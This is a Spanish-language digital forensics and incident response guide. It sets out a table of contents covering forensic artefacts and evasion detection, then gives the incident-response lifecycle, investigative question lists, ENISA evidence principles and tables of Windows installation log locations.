<h1 align="center">Digital Forensics Incident Response & Detection Engineering</h1>

<div align="center">
  <img src="DFIR-logo.png" alt="DFIR & Detection Engineering" width="485">
</div>
<br>
Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense y detección de técnicas utilizadas por actores maliciosos para la evasión de sistemas de protección y monitorización.

<h1>Índice</h1>

- [📓 Análisis Forense, Artefactos y Respuesta Incidentes](#-análisis-forense-artefactos-y-respuesta-incidentes)
  - [📁 Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)](#-gestión-de-respuesta-a-incidentes-y-análisis-forense-digital-dfir)
    - [📜 Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?](#-diagrama-de-preguntas-de-respuesta-a-incidentes---análisis-inicial-qué-ha-pasado)
    - [📜 Ciclo de vida - Respuesta a Incidentes](#-ciclo-de-vida---respuesta-a-incidentes)
    - [📜 Preguntas - Respuesta a Incidentes](#-preguntas---respuesta-a-incidentes)
    - [📜 Preguntas - Análisis Forense Digital](#-preguntas---análisis-forense-digital)
    - [📜 Metodología - Análisis Forense Digital](#-metodología---análisis-forense-digital)
  - [📁 Windows](#-windows)
    - [📜 Logs de eventos de Windows](#-logs-de-eventos-de-windows)
    - [📜 Logs de registros sobre instalaciones de Windows](#-logs-de-registros-sobre-instalaciones-de-windows)
    - [📜 Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR](#-lista-de-events-id-de-windows-y-sysmon-relevantes-en-investigaciones-dfir)
    - [📜 Artefactos de Tareas programadas en Windows](#-artefactos-de-tareas-programadas-en-windows)
    - [📜 Scripts para detectar actividades sospechosas en Windows](#-scripts-para-detectar-actividades-sospechosas-en-windows)
    - [📜 Obtener software instalado y sus versiones (x86 y x64)](#-obtener-software-instalado-y-sus-versiones-x86-y-x64)
    - [📜 Análisis y artefactos de ShellBags](#-análisis-y-artefactos-de-shellbags)
    - [📜 Análisis de memoria RAM: Generación de línea temporal (Volatility 3)](#-análisis-de-memoria-ram-generación-de-línea-temporal-volatility-3)
    - [📜 Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT\&CK*)](#-detectar-peristencia-de-ejecutables-en-el-registro-de-windows-técnicas-basadas-en-la-matriz-de-mitre-attck)
    - [📜 Artefactos de conexiones de clientes VPN](#-artefactos-de-conexiones-de-clientes-vpn)
    - [📜 Persistencia en servicios](#-persistencia-en-servicios)
    - [📜 Auditar cambios de membresía en grupos críticos (últimos 15 días)](#-auditar-cambios-de-membresía-en-grupos-críticos-últimos-15-días)
    - [📜 ¿Han eliminado el registro de eventos de Windows?](#-han-eliminado-el-registro-de-eventos-de-windows)
    - [📜 Volatility 3: clipboard](#-volatility-3-clipboard)
    - [📜 Comprobar archivos abiertos recientemente por el usuario](#-comprobar-archivos-abiertos-recientemente-por-el-usuario)
    - [📜 Analizar ficheros Windows Prefetch (.pf)](#-analizar-ficheros-windows-prefetch-pf)
    - [📜 Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente](#-artefactos-adobe-acrobat-caché-de-historial-de-pdfs-abiertos-recientemente)
    - [📜 Ventana "Ejecutar" y "barra direcciones de Explorer.exe": Caché de historial de ficheros y paths visitados recientemente](#-ventana-ejecutar-y-barra-direcciones-de-explorerexe-caché-de-historial-de-ficheros-y-paths-visitados-recientemente)
    - [📜 Thumbcache Viewer](#-thumbcache-viewer)
    - [📜 Historial de pestañas sin cerrar de Notepad.exe (Win11)](#-historial-de-pestañas-sin-cerrar-de-notepadexe-win11)
    - [📜 Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn](#-artefáctos-forenses-en-anydesk-team-viewer-y-logmein)
    - [📜 Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)](#-sesiones-de-conexión-remota-almacenadas-con-putty-mobaxterm-winscp-ssh-rdp-ftp-sftp-scp-u-otras)
    - [📜 Artefactos y trazabilidad en conexiones RDP](#-artefactos-y-trazabilidad-en-conexiones-rdp)
    - [📜 Artefactos Bitmaps y Prefetch en RDP](#-artefactos-bitmaps-y-prefetch-en-rdp)
    - [📜 Caché almacenada de conexiones establecidas a otros hosts vía RDP](#-caché-almacenada-de-conexiones-establecidas-a-otros-hosts-vía-rdp)
    - [📜 Conocer la URL de descarga de un archivo (ADS Zone.Identifier)](#-conocer-la-url-de-descarga-de-un-archivo-ads-zoneidentifier)
    - [📜 Modificar y detectar Timestomping en ficheros (técnica anti-forense)](#-modificar-y-detectar-timestomping-en-ficheros-técnica-anti-forense)
    - [📜 Windows Search Index (archivos Windows.edb, .crwl, .blf, .jrs)](#-windows-search-index-archivos-windowsedb-crwl-blf-jrs)
    - [📜 PSReadLine: Historial de comandos ejecutados en una consola PowerShell](#-psreadline-historial-de-comandos-ejecutados-en-una-consola-powershell)
    - [📜 Artefactos forense - MS Word](#-artefactos-forense---ms-word)
    - [📜 Análisis de malware en ficheros XLSX (MS Excel)](#-análisis-de-malware-en-ficheros-xlsx-ms-excel)
    - [📜 Análisis de malware en ficheros MS Office (oletools)](#-análisis-de-malware-en-ficheros-ms-office-oletools)
    - [📜 Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)](#-herramientas-de-análisis-en-ficheros-ms-office-y-otros-detectar-malware-o-phising)
    - [📜 Herramientas de análisis PDF (detectar malware o phising)](#-herramientas-de-análisis-pdf-detectar-malware-o-phising)
    - [📜 Identificar Shellcodes en ficheros y otros comandos de análisis](#-identificar-shellcodes-en-ficheros-y-otros-comandos-de-análisis)
    - [📜 Detectar URL maliciosas en el documento](#-detectar-url-maliciosas-en-el-documento)
    - [📜 Asignación de IPs en equipos](#-asignación-de-ips-en-equipos)
    - [📜 Windows Firewall (wf.msc): Reglas residuales de software desintalado](#-windows-firewall-wfmsc-reglas-residuales-de-software-desintalado)
    - [📜 Persistencia: suplantación de procesos del sistema](#-persistencia-suplantación-de-procesos-del-sistema)
    - [📜 Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP](#-herramientas-para-consultar-y-auditar-gpos-control-de-accesos-usuarios-grupos-y-otros-funciones-de-active-directory-y-ldap)
    - [📜 Análisis de phishing mails (extensión .eml)](#-análisis-de-phishing-mails-extensión-eml)
    - [📜 MUICache: artefactos sobre aplicaciones](#-muicache-artefactos-sobre-aplicaciones)
    - [📜 FeatureUsage: reconstruir las actividades de los usuarios](#-featureusage-reconstruir-las-actividades-de-los-usuarios)
    - [📜 MRU (Most Recently Used): Artefactos de Office local y Office 365](#-mru-most-recently-used-artefactos-de-office-local-y-office-365)
    - [📜 Ver el úlimo fichero descomprimido 7-Zip](#-ver-el-úlimo-fichero-descomprimido-7-zip)
    - [📜 Detectar antimalware instalado y su estado usando WMI](#-detectar-antimalware-instalado-y-su-estado-usando-wmi)
    - [📜 Detectar servicios configurados con cuentas de dominio](#-detectar-servicios-configurados-con-cuentas-de-dominio)
    - [📜 LOLBins comunes y sus artefactos](#-lolbins-comunes-y-sus-artefactos)
  - [📁 Linux](#-linux)
    - [📜 Logs del sistema de Linux](#-logs-del-sistema-de-linux)
    - [📜 Logs de aplicaciones de Linux](#-logs-de-aplicaciones-de-linux)
    - [📜 Logs journalctl (systemd)](#-logs-journalctl-systemd)
    - [📜 Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución](#-copiar-un-binario-malicioso-ya-eliminado-a-través-de-su-proceso-todavía-en-ejecución)
    - [📜 Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)](#-identificar-y-obtener-archivos-con-pid-de-procesos-maliciosos-conexiones-ssh-linux)
    - [📜 Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)](#-recopilar-información-en-un-primer-análisis-de-respuesta-a-incidentes-sistema-linux)
    - [📜 Historial de comandos de la Shell de Linux (.bash\_history \& .zsh\_history)](#-historial-de-comandos-de-la-shell-de-linux-bash_history--zsh_history)
    - [📜 Voldado de todos los directorios y ficheros de Linux](#-voldado-de-todos-los-directorios-y-ficheros-de-linux)
    - [📜 Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)](#-volcado-de-memoria-ram-en-linux-con-lime-linux-memory-extractor)
    - [📜 Comprobar si un usuario ejecutó el comando "sudo"](#-comprobar-si-un-usuario-ejecutó-el-comando-sudo)
    - [📜 Detectar malware Linux fileless (memfd)](#-detectar-malware-linux-fileless-memfd)
  - [📁 Redes](#-redes)
    - [📜 Filtros Wireshark para analistas](#-filtros-wireshark-para-analistas)
  - [📁 Contenedores](#-contenedores)
    - [📜 Análisis Forense en contenedores Docker](#-análisis-forense-en-contenedores-docker)
  - [📁 Android \& iOS](#-android--ios)
    - [📜 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp](#-forense-android-evidencias-de-imágenes-eliminadas-y-enviadas-por-whatsapp)
  - [📁 Varios](#-varios)
    - [📜 Artefactos en dispositivos USB en Windows, Linux y MacOS](#-artefactos-en-dispositivos-usb-en-windows-linux-y-macos)
    - [📜 Recopilación de artefactos de paths en Windows, Linux y MacOS](#-recopilación-de-artefactos-de-paths-en-windows-linux-y-macos)
  - [📁 Herramientas](#-herramientas)
    - [📜 Autopsy: Herramienta avanzada de análisis forense digital](#-autopsy-herramienta-avanzada-de-análisis-forense-digital)
    - [📜 X-Ways Forensics: Herramienta avanzada de análisis forense digital](#-x-ways-forensics-herramienta-avanzada-de-análisis-forense-digital)
    - [📜 Volatility 3: Análisis de volcados de memoria](#-volatility-3-análisis-de-volcados-de-memoria)
    - [📜 WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows](#-wintriage-securizame-análisis-y-extracción-de-artefactos-forenses-windows)
    - [📜 Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows](#-velociraptor-recolección-monitorización-y-hunting-para-análisis-forense-digital-y-respuesta-a-incidentes-en-windows)
    - [📜 LogonTracer: Trazabilidad de inicios de sesión en Active Directory](#-logontracer-trazabilidad-de-inicios-de-sesión-en-active-directory)
    - [📜 AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación](#-authlogparser-análisis-authlog-resumen-de-registros-relacionados-con-autenticación)
    - [📜 Skadi: Análisis de artefactos e imágenes forenses](#-skadi-análisis-de-artefactos-e-imágenes-forenses)
    - [📜 GRR - Google Rapid Response](#-grr---google-rapid-response)
    - [📜 Arkime - Almacenar e indexar el tráfico de red en formato PCAP](#-arkime---almacenar-e-indexar-el-tráfico-de-red-en-formato-pcap)
    - [📜 Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS](#-live-forensicator---recolección-automatizada-de-información-y-artefactos-en-windows-linux-y-macos)
    - [📜 FTK Forensic Toolkit (Exterro)](#-ftk-forensic-toolkit-exterro)
    - [📜 EnCase Forensic (ondata)](#-encase-forensic-ondata)
    - [📜 SANS DFIR - Posters \& Cheat Sheets](#-sans-dfir---posters--cheat-sheets)
- [📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense](#-detección-de-técnicas-de-evasión-en-sistemas-siem-soc-y-anti-forense)
  - [📁 Windows](#-windows-1)
    - [📜 Comando Windows: "net" y "net1"](#-comando-windows-net-y-net1)
    - [📜 Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)](#-detectar-técnicas-maliciosas-realizadas-a-través-de-certutil-lolbin)
    - [📜 Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"](#-detectar-descargas-de-ficheros-realizadas-a-través-de-powershell-usando-invoke-webrequest-invoke-restmethod-bitstransfer)
    - [📜 Post-Explotación - PrivEsc con scmanager](#-post-explotación---privesc-con-scmanager)
    - [📜 DLL Hijacking *cscapi.dll*](#-dll-hijacking-cscapidll)
    - [📜 Otras técnicas de ejecución de CMD o PowerShell](#-otras-técnicas-de-ejecución-de-cmd-o-powershell)
    - [📜 Uso de *type* para descargar o subir ficheros](#-uso-de-type-para-descargar-o-subir-ficheros)
    - [📜 Bloquear conexiones USB: Rubber Ducky y Cactus WHID](#-bloquear-conexiones-usb-rubber-ducky-y-cactus-whid)
    - [📜 Claves de registro de Windows donde se almacenan las contraseñas](#-claves-de-registro-de-windows-donde-se-almacenan-las-contraseñas)
    - [📜 WDigest Authentication (lsass.exe): Habilitado / Deshabilitado](#-wdigest-authentication-lsassexe-habilitado--deshabilitado)
    - [📜 Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)](#-detectar-si-un-sistema-es-una-máquina-física-o-virtual-y-su-tipo-de-hipervisor-o-csp-azure-aws-gcp)
    - [📜 Técnicas de ofuscación en la ejecución de comandos en Windows](#-técnicas-de-ofuscación-en-la-ejecución-de-comandos-en-windows)
    - [📜 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)](#-detectar-acciones-de-autorun-al-abrir-una-command-prompt-cmd)
    - [📜 Extensiones ejecutables alternativas a .exe](#-extensiones-ejecutables-alternativas-a-exe)
    - [📜 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX\_ALLOCATION)](#-detectar-malware-que-se-está-ejecutando-desde-una-carpeta-que-no-permite-su-acceso-por-error-de-ubicación-flujo-ntfs-en-directorios-index_allocation)
    - [📜 Windows Search Index: Detección de técnicas anti-forenses y evasión](#-windows-search-index-detección-de-técnicas-anti-forenses-y-evasión)
    - [📜 Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)](#-deshabilitar-windows-defender-para-eludir-la-detección-de-amsi-en-la-ejecución-de-binarios-maliciosos-renombrar-msmpengexe-a-través-del-registro-controlset00x)
  - [📁 Linux](#-linux-1)
    - [📜 *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria](#-debugfs-para-eludir-alertas-al-ejecutar-comandos-o-acceder-a-ficheros-con-auditoria)
    - [📜 Detectar la ejecución de comandos de forma oculta en history](#-detectar-la-ejecución-de-comandos-de-forma-oculta-en-history)
    - [📜 Deshabilitar el uso del historial de la Shell](#-deshabilitar-el-uso-del-historial-de-la-shell)
    - [📜 Eliminar el historial de comandos de la Shell (.bash\_history \& .zsh\_history)](#-eliminar-el-historial-de-comandos-de-la-shell-bash_history--zsh_history)
    - [📜 Auditoría en el uso privilegiado de los siguientes comandos en Linux](#-auditoría-en-el-uso-privilegiado-de-los-siguientes-comandos-en-linux)
  - [📁 Redes](#-redes-1)
    - [📜 WAF Bypass (SSRF): usar acortamiento IP local](#-waf-bypass-ssrf-usar-acortamiento-ip-local)
    - [📜 Dirección IPv6 asignada a IPv4 utilizada para ofuscación](#-dirección-ipv6-asignada-a-ipv4-utilizada-para-ofuscación)
  - [📁 Varios](#-varios-1)
    - [📜 Forensia (Anti-Forensic)](#-forensia-anti-forensic)

---

# 📓 Análisis Forense, Artefactos y Respuesta Incidentes

## 📁 Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)

### 📜 Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?

[![](https://mermaid.ink/img/pako:eNp9VU1vEzEQ_SvWnrbSFpSGUw9U2aQSSAUVWi4ol4k9SQ1ee-uPQqj6Y3rsgVN_ABL7xxjvRxoSt3tK1jPjN2_em73NuBGYHWdLZX7wK7CenX2ea0bPJP_751NoHtgVsBocCHNy0J305-zw8C0rRxQ2YddBNg-awRK5hyGuHPUhk_yLC2Clcex1nz08XEnUHhMHRsHCWLrWotsUHC4tB3ACubSK8tc7-W2N5rEyT2jKPnmanzpvweNKAhVIJZoqaMmBy-ZR73RzlF80j8oksiQ1YjVUsaEEVdNI1SW1i8xijZYHJ40m6P9XUriC2JDZI0QTaO5DPB2amo760pN8arQLyoONkQl0ztTGeuzqb9IHaGV-3jxYIUXLiABvXKIGoXZGRwA79x9Ra6eOBU3ZSvoUO9cBWW0EVMnKAnXQXILddHbUV57k74w2tmDn1tQSBYhnqFfYklPEP5a4pdEViVD86Y3tT9HzV7v3RWldohYWI9KIer_GitQsiGm8kQScYCfJAgtkHo6WKXih5aeOO4FOx9F6F7BoAQgCmtSowxcqlPlEN_dKOunYkhykKfowKXTtSVO9aIJOzzwOtK9CN21rejbKzwikQ3sjefT3rg0JgMeK-OlWgzCDcmadcmY0X3Jjc6_ZAr6ldKMDkltNp38zKJfyuvxxuUUWDIso1YaQlsE6kMLXz9vjZK_-tNNDW98iD-SAZ6cdMVIoCUMlRcqjXLYuGU-7S95MaKn8Lja97ufSEqzJ4LBQcezs_WVaEVFujINdmb0ryvyjKTYDb9lSL6wJsgktM7M7rbKdt-_5SLor7kAlf23PutflbNyuqQ2A9KIi7mprbhBp9R9kRVahrUAK-kjdxuB55q-wwnl2TD_JhN_n2VzfURwEby7WmmfHZH8sslDTGsOZhJWFanhJKiD7f-g-eu23r8hq0F-NoZAlKId3_wA9zfu8?type=png)](https://mermaid.live/edit#pako:eNp9VU1vEzEQ_SvWnrbSFpSGUw9U2aQSSAUVWi4ol4k9SQ1ee-uPQqj6Y3rsgVN_ABL7xxjvRxoSt3tK1jPjN2_em73NuBGYHWdLZX7wK7CenX2ea0bPJP_751NoHtgVsBocCHNy0J305-zw8C0rRxQ2YddBNg-awRK5hyGuHPUhk_yLC2Clcex1nz08XEnUHhMHRsHCWLrWotsUHC4tB3ACubSK8tc7-W2N5rEyT2jKPnmanzpvweNKAhVIJZoqaMmBy-ZR73RzlF80j8oksiQ1YjVUsaEEVdNI1SW1i8xijZYHJ40m6P9XUriC2JDZI0QTaO5DPB2amo760pN8arQLyoONkQl0ztTGeuzqb9IHaGV-3jxYIUXLiABvXKIGoXZGRwA79x9Ra6eOBU3ZSvoUO9cBWW0EVMnKAnXQXILddHbUV57k74w2tmDn1tQSBYhnqFfYklPEP5a4pdEViVD86Y3tT9HzV7v3RWldohYWI9KIer_GitQsiGm8kQScYCfJAgtkHo6WKXih5aeOO4FOx9F6F7BoAQgCmtSowxcqlPlEN_dKOunYkhykKfowKXTtSVO9aIJOzzwOtK9CN21rejbKzwikQ3sjefT3rg0JgMeK-OlWgzCDcmadcmY0X3Jjc6_ZAr6ldKMDkltNp38zKJfyuvxxuUUWDIso1YaQlsE6kMLXz9vjZK_-tNNDW98iD-SAZ6cdMVIoCUMlRcqjXLYuGU-7S95MaKn8Lja97ufSEqzJ4LBQcezs_WVaEVFujINdmb0ryvyjKTYDb9lSL6wJsgktM7M7rbKdt-_5SLor7kAlf23PutflbNyuqQ2A9KIi7mprbhBp9R9kRVahrUAK-kjdxuB55q-wwnl2TD_JhN_n2VzfURwEby7WmmfHZH8sslDTGsOZhJWFanhJKiD7f-g-eu23r8hq0F-NoZAlKId3_wA9zfu8)

### 📜 Ciclo de vida - Respuesta a Incidentes

[![](https://mermaid.ink/img/pako:eNpFkMFqwzAMhl_F6JRB8gI5DNokhUILpbsNX4SttGaJbVSZMUqfao-wF5vrkewmPn1C0n8HEyxBC-MUPs0VWdThrP2mOjFFZDTu59u_ZKCa5lVtq70lL250Zu1sS6eruuCF_EK7QvtqYEa72CqooxN3WWf7Yg3VmUyK9L9tKHz35BidpGmdP4WbNPu85nkHZXVX1A3UMBPP6Gz-5a69UhrkSjNpaHNpkT80aP_IHiYJb1_eQCucqIYULQr1Di-MM7QjTrdMyToJfPwLp2RUQ0T_HsLiPH4Bf1ptrQ?type=png)](https://mermaid.live/edit#pako:eNpFkMFqwzAMhl_F6JRB8gI5DNokhUILpbsNX4SttGaJbVSZMUqfao-wF5vrkewmPn1C0n8HEyxBC-MUPs0VWdThrP2mOjFFZDTu59u_ZKCa5lVtq70lL250Zu1sS6eruuCF_EK7QvtqYEa72CqooxN3WWf7Yg3VmUyK9L9tKHz35BidpGmdP4WbNPu85nkHZXVX1A3UMBPP6Gz-5a69UhrkSjNpaHNpkT80aP_IHiYJb1_eQCucqIYULQr1Di-MM7QjTrdMyToJfPwLp2RUQ0T_HsLiPH4Bf1ptrQ)

<table>
  <tr>
    <td><strong>Preparación</strong></td>
    <td>Reúne las herramientas necesarias y aprende su funcionamiento, familiarizándote con ellas.</td>
    <td>
      - Antimalware y comprobadores de integridad de ficheros/dispositivos.<br>
      - Escáneres de vulnerabilidades, análisis de logs, detectores de intrusiones y otras herramientas de auditoría.<br>
      - Recuperación de backups.<br>
      - Herramientas de análisis forense (las traerá el perito forense).
    </td>
  </tr>
  <tr>
    <td><strong>Identificación</strong></td>
    <td>Detecta el incidente, determina su alcance y forma de solución e involucra a los responsables del negocio, las operaciones y la comunicación.</td>
    <td>
      - Contacta con el soporte técnico, con el CIRST o CERT, o con un perito forense si fuera necesario.<br>
      - Contacta con la policía si fuera necesario.<br>
      - Contacta con el asesor legal si fuera necesario.
    </td>
  </tr>
  <tr>
    <td><strong>Contención</strong></td>
    <td>Impide que el incidente se extienda a otros recursos, minimizando su impacto.</td>
    <td>
      - Separa el/los equipos de la red cableada o wifi.<br>
      - Deshabilita cuentas de usuario comprometidas.<br>
      - Cambia las contraseñas de las cuentas de usuario comprometidas.
    </td>
  </tr>
  <tr>
    <td><strong>Erradicación (mitigación) y Recuperación</strong></td>
    <td>Elimina si fuera necesario los elementos comprometidos antes de iniciar la recuperación.</td>
    <td>
      - Reinstala los sistemas afectados.<br>
      - Restaura desde un backup.
    </td>
  </tr>
  <tr>
    <td><strong>Recapitulación o Post-Incidente</strong></td>
    <td>Documenta los detalles del incidente, archiva los datos recogidos y establece un debate constructivo sobre las lecciones aprendidas.</td>
    <td>
      - Informa a los empleados del incidente y dales instrucciones para evitarlo en el futuro.<br>
      - Informa a los medios y a los clientes si fuera necesario.
    </td>
  </tr>
</table>

- Referencia - Cuestionario inicial de respuesta a incidentes (INCIBE): https://www.incibe.es/sites/default/files/contenidos/JuegoRol/juegorol_cuestionarioinicialrespuestaincidentes.pdf

### 📜 Preguntas - Respuesta a Incidentes

**¿Quién?, ¿Qué?, ¿Dónde?, ¿Cuándo?, ¿Cómo o en qué? y ¿Por qué?**

<table>
  <tbody>
    <tr>
      <td><strong>Quién</strong></td>
      <td>
        - Se beneficia de esto?<br>
        - Esto es perjudicial para?<br>
        - Toma decisiones al respecto?<br>
        - Se ve directamente más afectado?<br>
        - Ha oído hablar también de esto?<br>
        - Sería la mejor persona para consultar?<br>
        - Serán las personas clave en esto?<br>
        - Merece reconocimiento por esto?
      </td>
      <td><strong>Qué</strong></td>
      <td>
        - Qué ha sucedido o cuáles son los signos de alerta?<br>
        - Son las fortalezas/debilidades?<br>
        - Es otra perspectiva?<br>
        - Es otra alternativa?<br>
        - Sería un contraargumento?<br>
        - Es el mejor/peor de los casos?<br>
        - Es lo más/menos importante?<br>
        - Podemos hacer para lograr un cambio positivo?<br>
        - Se interpone en el camino de nuestra acción?
      </td>
    </tr>
    <tr>
      <td><strong>Dónde</strong></td>
      <td>
        - Dónde ha ocurrido?<br>
        - Veríamos esto en el mundo real?<br>
        - Existen conceptos/situaciones similares?<br>
        - Existe la mayor necesidad de esto?<br>
        - En el mundo sería esto un problema?<br>
        - Es esto aceptable/inaceptable?<br>
        - Esto beneficiaría a nuestra sociedad?<br>
        - Esto causaría un problema?<br>
        - Es el mejor momento para tomar acción?
      </td>
      <td><strong>Cuándo</strong></td>
      <td>
        - Cuándo se produjo?<br>
        - Es esto un problema/desafío?<br>
        - Es relevante para mí/otros?<br>
        - Es este el mejor/peor escenario?<br>
        - La gente está influenciada por esto?<br>
        - Es esto similar a?<br>
        - Esto altera las cosas?<br>
        - Sabemos la verdad sobre esto?<br>
        - Abordaremos esto con seguridad?
      </td>
    </tr>
    <tr>
      <td><strong>Cómo o en qué</strong></td>
      <td>
        - Cómo o en qué circunstancias?<br>
        - La gente debería saber acerca de esto?<br>
        - Ha sido así durante tanto tiempo?<br>
        - Hemos permitido que esto suceda?<br>
        - Esto nos beneficia a nosotros/otros?<br>
        - Esto nos hace daño a nosotros/otros?<br>
        - Vemos esto en el futuro?<br>
        - Podemos cambiar esto para nuestro bien?
      </td>
      <td><strong>Por qué</strong></td>
      <td>
        - Por qué se ha producido o cuál es su origen?<br>
        - Podemos obtener más información?<br>
        - Cuáles son las áreas de mejora?<br>
        - Sabremos que hemos tenido éxito?<br>
        - Podemos esperar que esto cambie?<br>
        - Debemos pedir ayuda con esto?
      </td>
    </tr>
  </tbody>
</table>

### 📜 Preguntas - Análisis Forense Digital

 - ¿Dónde se encuentra físicamente la información?.
 - Qué dispositivos de almacenamiento copiar.
 - ¿Se debe apagar un dispositivo para realizar la adquisición?.
 - Orden para realizar las copias, teniendo en cuenta la volatilidad de los datos implicados.
 - ¿Es necesario buscar y copiar dispositivos ocultos, no visibles o remotos?.
 - ¿Se han empleado técnicas anti forenses para ocultar información?.
 - Necesidad de soporte de un especialista forense.
 - Necesidad de un fedatario.

### 📜 Metodología - Análisis Forense Digital

Resumen de operativa de las cinco fases de un Análisis Forense en la adquisición de evidencias digitales.

[![](https://mermaid.ink/img/pako:eNo9z0EKwjAQBdCrhFlVaC_QhdAadwqiO8lmSEYbbBJNE0Wkh_EMHsGLGVLsbnjzGea_QDpFUMOpdw_ZoQ9ssxe2KRp1i3rQUn8_dpGAVdWStcXO00D-jn9vs6-Kxn7ffcoPyVbZeMGdjIZsmMM8L9bTkdmhBEPeoFbpjZewjAkIHRkSUKdRob8IEHZMOYzBHZ5WQh18pBLiVWEgrvHs0UB9wn5ISkoH57dTr1yvhCvao3P_zPgDlLtVig?type=png)](https://mermaid.live/edit#pako:eNo9z0EKwjAQBdCrhFlVaC_QhdAadwqiO8lmSEYbbBJNE0Wkh_EMHsGLGVLsbnjzGea_QDpFUMOpdw_ZoQ9ssxe2KRp1i3rQUn8_dpGAVdWStcXO00D-jn9vs6-Kxn7ffcoPyVbZeMGdjIZsmMM8L9bTkdmhBEPeoFbpjZewjAkIHRkSUKdRob8IEHZMOYzBHZ5WQh18pBLiVWEgrvHs0UB9wn5ISkoH57dTr1yvhCvao3P_zPgDlLtVig)

`1. Adquisición` 

Donde se realiza una copia de la información susceptible de poder ser presentada como prueba en un proceso. Estas evidencias deben ser recogidas sin alterar los originales, utilizando dispositivos o procedimiento de sólo lectura que garanticen que no se sobrescribe el medio de almacenamiento de origen. Se debe respetar la volatilidad de las muestras y priorizar su recogida. Y se deben etiquetar y almacenar todos los dispositivos originales de forma segura.

`2. Preservación` 

En esta fase se garantiza la perdurabilidad en el tiempo y la cadena de custodia de la información recogida.

`3. Análisis`

Se emplean técnicas que, junto con la experiencia y la inteligencia del analista, ayudarán a resolver el qué, el cómo y el quién del caso analizado.

`4. Documentación`

Fase en la que se asegura que todo el proceso (información y procedimientos aplicados) queda correctamente documentado y fechado.

`5. Presentación`

Donde se generan al menos un informe ejecutivo y otro técnico recogiendo las conclusiones de todo el análisis.

**Principios que deben asegurarse en la gestión de evidencias digitales según la ENISA (European Network and Information Security Agency).**

- **Integridad de los datos**: No se debe modificar ningún dato que deba usarse en la resolución de un caso por un juzgado. La persona encargada de la escena del crimen o de la recolección es la responsable de que eso no ocurra. Además, si el dispositivo recogido está encendido, la adquisición debe hacerse de forma que se modifique lo mínimo posible.

- **Registro**: Se debe crear y actualizar un registro con todas las acciones realizadas sobre las evidencias recogidas, desde su adquisición hasta cualquier consulta posterior.

- **Soporte de especialistas**: En cualquier momento durante la adquisición debe ser posible la intervención de un especialista debidamente formado en técnicas forenses digitales. Dicho especialista debe tener el suficiente conocimiento técnico y legal, así como la experiencia y autorización necesarias.

- **Formación**: Cualquier persona que maneje evidencias digitales debe tener una formación básica técnica y legal.

- **Legalidad**: Se debe asegurar la legalidad correspondiente a lo largo de todo el proceso.

> [!NOTE]
> **ENISA - Electronic evidence - A basic guide for First Responders**
> 
> https://www.enisa.europa.eu/publications/electronic-evidence-a-basic-guide-for-first-responders

## 📁 Windows

### 📜 Logs de eventos de Windows

| File Path | Info | Evidencias |
|-----------|------|------------|
| `%SYSTEMROOT%\System32\config` `%SYSTEMROOT%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |

### 📜 Logs de registros sobre instalaciones de Windows

| File Path | Info | Evidencias |
|-----------|------|------------|
| `%SYSTEMROOT%\setupact.log` | Contiene información acerca de las acciones de instalación durante la misma | Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación |
| `%SYSTEMROOT%\setuperr.log` | Contiene información acerca de los errores de instalación durante la misma | Fallos de programas, rutas de red inaccesibles, rutas a volcados de memoria |
| `%SYSTEMROOT%\WindowsUpdate.log` | Registra toda la información de transacción sobre la actualización del sistema y aplicaciones | Tipos de hotfix instalados, fechas de instalación, elementos por actualizar |
| `%SYSTEMROOT%\Debug\mrt.log` | Resultados del programa de eliminación de software malintencionado de Windows | Fechas, Versión del motor, firmas y resumen de actividad |
| `%SYSTEMROOT%\security\logs\scecomp.old` | Componentes de Windows que no han podido ser instalados | DLL's no registradas, fechas, intentos de escritura,rutas de acceso |
| `%SYSTEMROOT%\SoftwareDistribution\ReportingEvents.log` | Contiene eventos relacionados con la actualización | Agentes de instalación, descargas incompletas o finalizadas, fechas, tipos de paquetes, rutas |
| `%SYSTEMROOT%\Logs\CBS\CBS.log` | Ficheros pertenecientes a ‘Windows Resource Protection’ y que no se han podido restaurar | Proveedor de almacenamiento, PID de procesos, fechas, rutas |
| `%AppData%\Local\Microsoft\Websetup` (Windows 8) | Contiene detalles de la fase de instalación web de Windows 8 | URLs de acceso, fases de instalación, fechas de creación, paquetes de programas |
| `%AppData%\setupapi.log` | Contiene información de unidades, services pack y hotfixes | Unidades locales y extraibles, programas de instalación, programas instalados, actualizaciones de seguridad, reconocimiento de dispositivos conectados |
